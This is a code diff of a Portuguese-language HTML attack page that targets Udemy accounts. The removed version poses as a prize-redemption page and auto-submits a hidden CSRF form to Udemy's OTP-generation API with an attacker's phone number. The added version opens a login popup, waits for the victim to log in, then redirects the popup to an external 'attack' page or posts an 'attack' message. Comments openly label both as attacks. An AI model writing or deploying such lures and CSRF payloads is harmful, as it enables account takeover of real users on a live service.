@@ -1,67 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Sistema de Recompensas</title>
-    <style>
-        body { font-family: Arial; text-align: center; padding: 20px; }
-        .container { max-width: 600px; margin: 0 auto; }
-        .btn { background: #4CAF50; color: white; padding: 10px 20px; border: none; cursor: pointer; }
-        .steps { text-align: left; margin: 20px 0; }
-    </style>
+    <title>Conteúdo Exclusivo</title>
 </head>
 <body>
-    <div class="container">
-        <h1>🎁 Resgate sua recompensa exclusiva!</h1>
-        
-        <div class="steps">
-            <h3>Para resgatar seu prêmio:</h3>
-            <ol>
-                <li>Clique no botão abaixo para fazer login (se necessário)</li>
-                <li>Após o login, retorne para esta página</li>
-                <li>Clique no botão "Resgatar Prêmio" que aparecerá</li>
-                <li>Seu prêmio será enviado para seu telefone registrado</li>
-            </ol>
-        </div>
-        
-        <button id="login-button" class="btn">Fazer Login no Site</button>
-        <div id="step2" style="display:none; margin-top: 30px;">
-            <h3>Agora clique abaixo para resgatar seu prêmio:</h3>
-            <button id="claim-button" class="btn">RESGATAR PRÊMIO AGORA</button>
-        </div>
-    </div>
+    <h1>Para acessar o conteúdo exclusivo, faça login:</h1>
+    <button id="login-button">Login com Site</button>
     
     <script>
+        let popup = null;
+        let checkPopupInterval;
+        
         document.getElementById('login-button').addEventListener('click', function() {
-            // Abre o site em uma nova aba para o usuário fazer login
-            window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode', '_blank');
+            // Abre um popup para o site alvo
+            popup = window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode', 'LoginWindow', 'width=600,height=700');
             
-            // Mostra o próximo passo quando o usuário retornar
-            this.textContent = "Já fiz login";
-            document.getElementById('step2').style.display = 'block';
+            // Verifica periodicamente se o usuário completou o login
+            checkPopupInterval = setInterval(checkIfLoggedIn, 1000);
         });
         
-        document.getElementById('claim-button').addEventListener('click', function() {
-             window.open('https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode', '_blank');
-            // Cria e submete o formulário malicioso quando o usuário clicar
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://www.udemy.com/api-2.0/auth/non-auth-otp/generate/';
-            form.enctype = 'text/plain';
-            form.target = '_blank'; // Abre em nova aba
+        function checkIfLoggedIn() {
+            try {
+                // Se conseguirmos acessar o popup e ele estiver na página de perfil
+                // Isso pode falhar por CORS, mas é uma tentativa
+                if (popup && popup.location.href.includes('perfil')) {
+                    clearInterval(checkPopupInterval);
+                    
+                    // Usuário está logado, agora podemos tentar o ataque
+                    attackAfterLogin();
+                }
+            } catch(e) {
+                // Erro CORS ao tentar acessar o popup - é esperado
+                console.log("Verificando login...");
+            }
             
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = '{"purpose":3,"phone_number":"';
-            input.value = '+5514996810417"}';
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Mostra mensagem de sucesso
-            this.textContent = "Prêmio Resgatado!";
-            this.disabled = true;
-        });
+            // Se o popup foi fechado, cancelamos a verificação
+            if (popup && popup.closed) {
+                clearInterval(checkPopupInterval);
+                console.log("Usuário fechou a janela de login");
+            }
+        }
+        
+        function attackAfterLogin() {
+            // O usuário está logado no popup, agora fazemos o ataque
+            // Criamos um form no popup ou redirecionamos para nossa página de ataque
+            try {
+                popup.location.href = 'https://alanls1.github.io/test/';
+            } catch(e) {
+                // Se falhar por CORS, tentamos injetar via postMessage
+                popup.postMessage({action: 'attack'}, 'https://www.udemy.com/join/passwordless-auth/?locale=en_US&next=https%3A%2F%2Fwww.udemy.com%2Flogout%2F&response_type=html&action=login&mode');
+            }
+        }
     </script>
 </body>
 </html>
